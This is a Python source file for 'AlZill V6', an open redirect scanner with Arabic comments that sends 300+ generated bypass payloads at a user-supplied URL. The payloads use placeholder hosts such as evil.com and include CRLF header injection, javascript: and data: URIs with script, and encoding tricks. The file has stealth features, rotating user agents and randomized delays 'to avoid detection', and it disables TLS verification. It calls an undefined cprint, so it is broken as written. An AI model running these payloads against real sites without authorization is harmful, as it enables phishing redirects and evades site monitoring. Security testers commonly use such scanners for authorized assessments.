#!/usr/bin/env python3
"""
Advanced Open Redirect Scanner - AlZill V6
Features: Smart Bypass, Fragment Handling, Domain Chaining, JavaScript Detection
"""

import asyncio
import aiohttp
import requests
import re
import urllib3
import time
import random
import string
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
from typing import List, Dict, Optional
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"

class StealthOpenRedirectScanner:
    """Open Redirect Scanner - Stealth mode + Advanced Bypass + Fragment Handling"""
    
    def __init__(self, timeout: int = 8, delay: float = 0.5, verbose: bool = False):
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.session = requests.Session()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
        ]
        self.request_count = 0
        self.confirmed_vulns = []
        self.total_requests = 0
        self.base_domain = None
        
        # ========== TEST DOMAINS (متنوعة للاختبار) ==========
        self.test_domains = [
            'evil-test.com', 'malicious.com', 'attacker.com',
            'evil.com', 'xss.xyz', 'redirect.test'
        ]
        
        # ========== 300+ PAYLOADS (سيتم توليدها ديناميكياً) ==========
        self.payloads = []
        
        # ========== REDIRECT PARAMETERS ==========
        self.redirect_params = [
            'next', 'redirect', 'redirect_uri', 'redirect_url', 'return', 'return_to',
            'return_url', 'goto', 'go', 'url', 'link', 'location', 'dest', 'destination',
            'target', 'to', 'out', 'view', 'forward', 'callback', 'continue', 'from',
            'source', 'state', 'service', 'resource', 'r', 'q', 'path', 'relay',
            'redirect_to', 'returnTo', 'ReturnUrl', 'success_url', 'failure_url',
            'cancel_url', 'error_url', 'logout_url', 'login_url', 'register_url',
            'next_url', 'goto_url', 'jump', 'jump_url', 'redirect_uri', 'redir',
            'redir_url', 'redirectUrl', 'Redirect', 'REDIRECT', 'nextPage',
            'next-page', 'return-path', 'returnPath', 'success_redirect',
            'failure_redirect', 'callback_url', 'callbackUrl', 'redirectLink'
        ]
        
        self.redirect_statuses = {301, 302, 303, 307, 308}
    
    def _rotate_user_agent(self):
        """Rotate User-Agent randomly"""
        self.session.headers.update({
            'User-Agent': random.choice(self.user_agents)
        })
    
    def _random_delay(self):
        """Random delay to avoid detection"""
        delay = self.delay + random.uniform(0, self.delay)
        time.sleep(delay)
    
    # ============================================================
    # GENERATE PAYLOADS (محسنة مع Bypass متقدم)
    # ============================================================
    
    def _generate_payloads(self, target_domain: str = None):
        """Generate 300+ unique payloads with advanced bypass techniques"""
        payloads = []
        
        # ============================================================
        # 1. Basic payloads
        # ============================================================
        for domain in self.test_domains:
            payloads.append(f"https://{domain}")
            payloads.append(f"http://{domain}")
            payloads.append(f"//{domain}")
            payloads.append(f"///{domain}")
            payloads.append(f"////{domain}")
        
        # ============================================================
        # 2. Whitelist Bypass - Backslash و Slash البديل
        # ============================================================
        for domain in self.test_domains:
            # Backslash bypass (بعض المتصفحات تحول \ إلى /)
            payloads.append(f"\\{domain}")
            payloads.append(f"\\\\{domain}")
            payloads.append(f"\\/\\/{domain}")
            payloads.append(f"\\\\/\\\\/{domain}")
            
            # Unicode Slash bypass
            payloads.append(f"https:%2f%2f{domain}")
            payloads.append(f"https:%2f/{domain}")
            payloads.append(f"https:%2f%2f%2f{domain}")
            
            # CRLF Injection
            payloads.append(f"%0ahttps://{domain}")
            payloads.append(f"%0d%0ahttps://{domain}")
            payloads.append(f"%0d%0aLocation: https://{domain}")
            
            # @ symbol manipulation
            payloads.append(f"@{domain}")
            payloads.append(f"https://{domain}@example.com")
            payloads.append(f"https://example.com@{domain}")
            payloads.append(f"https://example.com.{domain}")
            payloads.append(f"https://{domain}/example.com")
            payloads.append(f"https://example.com#@{domain}")
            payloads.append(f"https://example.com//{domain}")
        
        # ============================================================
        # 3. Dot-Slash Bypass (للمواقع التي تمنع http://)
        # ============================================================
        for domain in self.test_domains:
            payloads.append(f".//{domain}")
            payloads.append(f".///{domain}")
            payloads.append(f".////{domain}")
            payloads.append(f"..//{domain}")
            payloads.append(f"...//{domain}")
            payloads.append(f"....//{domain}")
        
        # ============================================================
        # 4. Path Traversal Bypass
        # ============================================================
        for domain in self.test_domains:
            payloads.append(f"//{domain}/%2f..")
            payloads.append(f"///{domain}/%2f..")
            payloads.append(f"////{domain}/%2f..")
            payloads.append(f"/https://{domain}")
            payloads.append(f"/https:///{domain}")
            payloads.append(f"https://{domain}/%2e%2e")
            payloads.append(f"https://{domain}/%252e%252e")
        
        # ============================================================
        # 5. Domain Chaining (ربط دومين الهدف مع دومين المهاجم)
        # ============================================================
        if target_domain:
            for evil in self.test_domains:
                # ربط دومين الهدف مع دومين المهاجم
                payloads.append(f"https://{target_domain}.{evil}")
                payloads.append(f"https://{evil}/{target_domain}")
                payloads.append(f"https://{target_domain}@{evil}")
                payloads.append(f"https://{evil}?redirect={target_domain}")
                payloads.append(f"https://{evil}#{target_domain}")
                payloads.append(f"https://{evil}/redirect?url={target_domain}")
                payloads.append(f"https://{target_domain}.evil.com")
                payloads.append(f"https://evil.com/{target_domain}")
        
        # ============================================================
        # 6. Fragment (#) Handling - تجبر السيرفر على قراءة الـ Fragment
        # ============================================================
        for domain in self.test_domains:
            # تقنيات مختلفة للـ Fragment
            payloads.append(f"https://{domain}#https://example.com")
            payloads.append(f"https://{domain}#@example.com")
            payloads.append(f"https://{domain}?https://example.com")
            payloads.append(f"https://{domain}?@example.com")
            payloads.append(f"https://{domain}#%2f%2fexample.com")
            payloads.append(f"https://{domain}#//example.com")
            payloads.append(f"https://{domain}#/redirect?url=https://example.com")
            
            # Fragment مع ترميز مزدوج
            payloads.append(f"https://{domain}%23https://example.com")
            payloads.append(f"https://{domain}%2523https://example.com")
        
        # ============================================================
        # 7. URL Encoding (مستويات متعددة)
        # ============================================================
        for domain in self.test_domains:
            # Single encoding
            payloads.append(quote(f"https://{domain}"))
            payloads.append(quote(f"http://{domain}"))
            payloads.append(quote(f"//{domain}"))
            
            # Double encoding
            payloads.append(quote(quote(f"https://{domain}")))
            payloads.append(quote(quote(f"http://{domain}")))
            payloads.append(quote(quote(f"//{domain}")))
            
            # Triple encoding
            payloads.append(quote(quote(quote(f"https://{domain}"))))
        
        # ============================================================
        # 8. Null Byte and Control Characters
        # ============================================================
        for domain in self.test_domains:
            payloads.append(f"https://{domain}%00@example.com")
            payloads.append(f"https://{domain}%0a@example.com")
            payloads.append(f"https://{domain}%0d@example.com")
            payloads.append(f"https://{domain}%09@example.com")
        
        # ============================================================
        # 9. Unicode/Hex Bypass
        # ============================================================
        for domain in self.test_domains:
            payloads.append(f"https://{domain}/%c0%ae%c0%ae%c0%af")
            payloads.append(f"https://{domain}/%2f%2e%2e")
            payloads.append(f"https://{domain}/%2f%2e%2e%2f")
            payloads.append(f"https://{domain}/%252f%252e%252e%252f")
        
        # ============================================================
        # 10. CRLF Injection for Response Splitting
        # ============================================================
        crlf_payloads = [
            f"https://evil-test.com%0aLocation: https://evil-test.com",
            f"https://evil-test.com%0d%0aLocation: https://evil-test.com",
            f"https://evil-test.com%0d%0a%0d%0a<script>alert(1)</script>",
        ]
        payloads.extend(crlf_payloads)
        
        # ============================================================
        # 11. Data URI and JavaScript
        # ============================================================
        js_payloads = [
            "javascript:alert('XSS')",
            "javascript:location.href='https://evil-test.com'",
            "data:text/html,<script>location.href='https://evil-test.com'</script>",
        ]
        payloads.extend(js_payloads)
        
        # ============================================================
        # 12. Protocol Relative with Multiple Slashes
        # ============================================================
        for domain in self.test_domains:
            payloads.append(f"//{domain}")
            payloads.append(f"///{domain}")
            payloads.append(f"////{domain}")
            payloads.append(f"/////{domain}")
            payloads.append(f"https:///evil-test.com")
            payloads.append(f"https:////evil-test.com")
        
        return list(set(payloads))[:350]
    
    # ============================================================
    # SMART PAYLOADS BASED ON TARGET DOMAIN
    # ============================================================
    
    def _generate_smart_payloads(self, target_domain: str) -> List[str]:
        """توليد بايلودات ذكية تعتمد على اسم الدومين المستهدف"""
        smart_payloads = []
        
        for evil in self.test_domains:
            # ربط دومين الهدف مع دومين المهاجم
            smart_payloads.append(f"https://{target_domain}.{evil}")
            smart_payloads.append(f"https://{evil}/{target_domain}")
            smart_payloads.append(f"https://{target_domain}@{evil}")
            smart_payloads.append(f"https://{evil}?redirect={target_domain}")
            smart_payloads.append(f"https://{evil}#{target_domain}")
            smart_payloads.append(f"https://{target_domain}.evil.com")
            smart_payloads.append(f"https://evil.com/{target_domain}")
            
            # Subdomain manipulation
            smart_payloads.append(f"https://{evil}.{target_domain}")
            smart_payloads.append(f"https://{target_domain}.evil.{target_domain}")
            smart_payloads.append(f"https://{evil}?domain={target_domain}")
            
            # Double domain chaining
            smart_payloads.append(f"https://{target_domain}.{evil}.com")
            smart_payloads.append(f"https://{evil}.com/{target_domain}/redirect")
        
        return list(set(smart_payloads))
    
    # ============================================================
    # ENHANCED DETECTION METHODS
    # ============================================================
    
    def _get_base_domain(self, url: str) -> str:
        """استخراج الدومين الأساسي من الـ URL"""
        parsed = urlparse(url)
        domain = parsed.netloc.lower()
        if domain.startswith('www.'):
            domain = domain[4:]
        # إزالة البورت إن وجد
        domain = domain.split(':')[0]
        return domain
    
    def _get_existing_params(self, url: str) -> List[str]:
        """استخراج الباراميترات الموجودة في الـ URL"""
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())
    
    def _build_url(self, base_url: str, params: Dict) -> str:
        """بناء URL مع باراميترات جديدة"""
        parsed = urlparse(base_url)
        existing = parse_qs(parsed.query)
        for k, v in params.items():
            existing[k] = [v]
        query = urlencode(existing, doseq=True)
        return urlunparse(parsed._replace(query=query))
    
    def _has_redirect_indicators(self, response_text: str) -> tuple:
        """
        الكشف المتقدم عن إشارات الـ Redirect
        يعيد (found, type, extracted_url)
        """
        indicators = []
        
        # ============================================================
        # 1. JavaScript Redirect Detection (محسن بـ Regex)
        # ============================================================
        js_redirect_patterns = [
            r"location\.href\s*=\s*['\"]([^'\"]+)['\"]",
            r"location\.replace\s*\(\s*['\"]([^'\"]+)['\"]\s*\)",
            r"location\.assign\s*\(\s*['\"]([^'\"]+)['\"]\s*\)",
            r"window\.location\s*=\s*['\"]([^'\"]+)['\"]",
            r"window\.location\.href\s*=\s*['\"]([^'\"]+)['\"]",
            r"window\.location\.replace\s*\(\s*['\"]([^'\"]+)['\"]\s*\)",
            r"window\.location\.assign\s*\(\s*['\"]([^'\"]+)['\"]\s*\)",
            r"self\.location\s*=\s*['\"]([^'\"]+)['\"]",
            r"top\.location\s*=\s*['\"]([^'\"]+)['\"]",
            r"parent\.location\s*=\s*['\"]([^'\"]+)['\"]",
            r"document\.location\s*=\s*['\"]([^'\"]+)['\"]",
            r"window\.open\s*\(\s*['\"]([^'\"]+)['\"]",
        ]
        
        for pattern in js_redirect_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                indicators.append(('JavaScript', match))
        
        # ============================================================
        # 2. Meta Refresh Detection
        # ============================================================
        meta_patterns = [
            r'<meta[^>]*http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url=([^"\']+)["\']',
            r'<meta[^>]*content=["\'][^"\']*url=([^"\']+)["\'][^>]*http-equiv=["\']refresh["\']',
            r'<meta[^>]*url=([^"\']+)[^>]*>',
        ]
        
        for pattern in meta_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                indicators.append(('Meta Refresh', match))
        
        # ============================================================
        # 3. HTML Redirect
        # ============================================================
        html_patterns = [
            r'<a\s+href=["\']([^"\']+)["\'][^>]*>',
            r'<form\s+action=["\']([^"\']+)["\'][^>]*>',
        ]
        
        for pattern in html_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            for match in matches:
                indicators.append(('HTML Link', match))
        
        if indicators:
            return True, indicators[0][0], indicators[0][1]
        
        return False, None, None
    
    def _attempt_exploitation(self, base_url: str, param_name: str, 
                              original_value: str, payload: str) -> Optional[str]:
        """محاولة استغلال الثغرة وتأكيدها"""
        
        test_url = self._build_url(base_url, {param_name: original_value + payload})
        
        try:
            response = self.session.get(test_url, allow_redirects=False, 
                                       timeout=self.timeout, verify=False)
            
            # ============================================================
            # 1. فحص HTTP Redirect Headers
            # ============================================================
            if response.status_code in self.redirect_statuses:
                location = response.headers.get('Location', '')
                for test_domain in self.test_domains:
                    if test_domain in location:
                        return f"HTTP {response.status_code} redirect to {test_domain}"
            
            # ============================================================
            # 2. فحص JavaScript و Meta Refresh
            # ============================================================
            has_redirect, redirect_type, redirect_url = self._has_redirect_indicators(response.text)
            if has_redirect:
                for test_domain in self.test_domains:
                    if test_domain in redirect_url:
                        return f"{redirect_type} redirect to {test_domain}"
            
            # ============================================================
            # 3. فحص الـ Location في الـ Body
            # ============================================================
            location_patterns = [
                r'Location:\s*(https?://[^\s]+)',
                r'Redirect:\s*(https?://[^\s]+)',
                r'URL:\s*(https?://[^\s]+)',
            ]
            
            for pattern in location_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    for test_domain in self.test_domains:
                        if test_domain in match:
                            return f"Location header in body to {test_domain}"
            
        except Exception as e:
            if self.verbose:
                print(f"    Exploit error: {e}")
        
        return None
    
    # ============================================================
    # MAIN SCAN FUNCTION
    # ============================================================
    
    def scan(self, url: str) -> Dict:
        """وظيفة المسح الرئيسية"""
        
        cprint("\n" + "="*70, INFO)
        cprint("[OPEN REDIRECT SCANNER] AlZill V6 - Advanced Detection", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, INFO)
        
        self.base_domain = self._get_base_domain(url)
        cprint(f"[*] Target Domain: {self.base_domain}", INFO)
        
        # ============================================================
        # توليد البايلودات ديناميكياً بناءً على الدومين المستهدف
        # ============================================================
        self.payloads = self._generate_payloads(self.base_domain)
        smart_payloads = self._generate_smart_payloads(self.base_domain)
        self.payloads.extend(smart_payloads)
        self.payloads = list(set(self.payloads))
        
        cprint(f"[*] Total Payloads: {len(self.payloads)} (including domain-specific)", INFO)
        cprint(f"[*] Bypass Techniques: Backslash | Dot-Slash | Fragment | Domain Chaining", WARNING)
        cprint(f"[*] Detection: HTTP Headers | JavaScript | Meta Refresh | HTML", WARNING)
        
        # ============================================================
        # تحديد الباراميترات للاختبار
        # ============================================================
        existing_params = self._get_existing_params(url)
        if existing_params:
            # فلترة الباراميترات التي تشبه redirect
            test_params = [p for p in existing_params if any(rp in p.lower() for rp in self.redirect_params)]
            if not test_params:
                test_params = existing_params[:15]
                cprint(f"[*] No redirect-like params found, testing {len(test_params)} parameters", WARNING)
            else:
                cprint(f"[*] Found {len(test_params)} redirect-like parameters", SUCCESS)
        else:
            test_params = self.redirect_params[:25]
            cprint("[!] No parameters found, testing common redirect parameters", WARNING)
        
        cprint(f"[*] Testing {len(test_params)} parameter(s)", INFO)
        cprint(f"[*] Delay: {self.delay}s (randomized)", INFO)
        
        # ============================================================
        # بناء الـ base URL
        # ============================================================
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # ============================================================
        # اختبار كل باراميتر
        # ============================================================
        for param_name in test_params:
            if self._test_parameter(base_url, param_name):
                # إذا وجدنا ثغرة، نستمر في اختبار باقي الباراميترات
                continue
        
        cprint(f"\n[*] Total requests sent: {self.total_requests}", INFO)
        return self._generate_report()
    
    def _test_parameter(self, base_url: str, param_name: str) -> bool:
        """اختبار باراميتر واحد مع جميع البايلودات"""
        
        for idx, payload in enumerate(self.payloads):
            self.total_requests += 1
            self._random_delay()
            
            # تدوير User-Agent كل 20 طلب
            if self.request_count % 20 == 0:
                self._rotate_user_agent()
            self.request_count += 1
            
            # عرض التقدم
            if self.verbose and idx % 50 == 0:
                cprint(f"    Testing {param_name}: {idx}/{len(self.payloads)} payloads", INFO)
            
            test_url = self._build_url(base_url, {param_name: payload})
            
            try:
                response = self.session.get(test_url, allow_redirects=False, 
                                           timeout=self.timeout, verify=False)
                
                # ============================================================
                # 1. فحص HTTP Status Codes (301, 302, etc.)
                # ============================================================
                if response.status_code in self.redirect_statuses:
                    location = response.headers.get('Location', '')
                    for test_domain in self.test_domains:
                        if test_domain in location:
                            exploited = self._attempt_exploitation(base_url, param_name, "", payload)
                            if exploited:
                                self.confirmed_vulns.append({
                                    'type': 'Open Redirect (HTTP 30x)',
                                    'parameter': param_name,
                                    'payload': payload[:80],
                                    'redirects_to': location[:100],
                                    'exploited': exploited,
                                    'severity': 'High',
                                    'verified': True
                                })
                                cprint(f"    ✅ Open Redirect: {param_name} -> {test_domain}", SUCCESS)
                                return True
                
                # ============================================================
                # 2. فحص JavaScript و Meta Refresh (محسن)
                # ============================================================
                has_redirect, redirect_type, redirect_url = self._has_redirect_indicators(response.text)
                if has_redirect:
                    for test_domain in self.test_domains:
                        if test_domain in redirect_url:
                            exploited = self._attempt_exploitation(base_url, param_name, "", payload)
                            if exploited:
                                self.confirmed_vulns.append({
                                    'type': f'Open Redirect ({redirect_type})',
                                    'parameter': param_name,
                                    'payload': payload[:80],
                                    'redirects_to': redirect_url[:100],
                                    'exploited': exploited,
                                    'severity': 'High',
                                    'verified': True
                                })
                                cprint(f"    ✅ Open Redirect: {param_name} -> {test_domain} ({redirect_type})", SUCCESS)
                                return True
                
                # ============================================================
                # 3. فحص إضافي للـ Location في الـ Body
                # ============================================================
                location_patterns = [
                    r'Location:\s*(https?://[^\s<\'"]+)',
                    r'Redirect:\s*(https?://[^\s<\'"]+)',
                    r'URL:\s*(https?://[^\s<\'"]+)',
                    r'RedirectURL:\s*(https?://[^\s<\'"]+)',
                ]
                
                for pattern in location_patterns:
                    matches = re.findall(pattern, response.text, re.IGNORECASE)
                    for match in matches:
                        for test_domain in self.test_domains:
                            if test_domain in match:
                                exploited = self._attempt_exploitation(base_url, param_name, "", payload)
                                if exploited:
                                    self.confirmed_vulns.append({
                                        'type': 'Open Redirect (Header in Body)',
                                        'parameter': param_name,
                                        'payload': payload[:80],
                                        'redirects_to': match[:100],
                                        'exploited': exploited,
                                        'severity': 'High',
                                        'verified': True
                                    })
                                    cprint(f"    ✅ Open Redirect: {param_name} -> {test_domain} (Body Location)", SUCCESS)
                                    return True
                                
            except requests.exceptions.Timeout:
                if self.verbose:
                    cprint(f"    Timeout on {param_name} with payload: {payload[:50]}", WARNING)
                continue
            except Exception as e:
                if self.verbose:
                    cprint(f"    Error on {param_name}: {e}", WARNING)
                continue
        
        return False
    
    def _generate_report(self) -> Dict:
        """توليد التقرير النهائي"""
        
        cprint("\n" + "="*70, INFO)
        cprint("📊 OPEN REDIRECT SCAN RESULTS", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, INFO)
        
        if self.confirmed_vulns:
            cprint(f"\n[!!!] {len(self.confirmed_vulns)} CONFIRMED OPEN REDIRECT VULNERABILITIES!", ERROR, attrs=['bold'])
            
            for i, vuln in enumerate(self.confirmed_vulns, 1):
                cprint(f"\n  [{i}] {vuln['type']}", ERROR)
                cprint(f"      Parameter: {vuln['parameter']}", INFO)
                if vuln.get('redirects_to'):
                    cprint(f"      Redirects to: {vuln['redirects_to']}", WARNING)
                if vuln.get('exploited'):
                    cprint(f"      Exploited: {vuln['exploited']}", SUCCESS)
                cprint(f"      Severity: {vuln['severity']}", ERROR)
                cprint(f"      Status: ✅ VERIFIED & EXPLOITABLE", SUCCESS)
        else:
            cprint(f"\n[✓] NO OPEN REDIRECT VULNERABILITIES CONFIRMED", SUCCESS)
            cprint(f"[*] {len(self.payloads)} payloads tested, all passed", INFO)
        
        cprint(f"\n[*] Total requests: {self.total_requests}", INFO)
        cprint("\n" + "="*70 + "\n", INFO)
        
        return {
            'confirmed_vulnerabilities': len(self.confirmed_vulns),
            'vulnerabilities': self.confirmed_vulns,
            'total_requests': self.total_requests,
            'secure': len(self.confirmed_vulns) == 0
        }


def scan(url, verbose=False):
    """Legacy function"""
    scanner = StealthOpenRedirectScanner(verbose=verbose)
    return scanner.scan(url)


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        scan(sys.argv[1], verbose=True)
    else:
        print("Usage: python open_redirect_scanner.py <target_url>")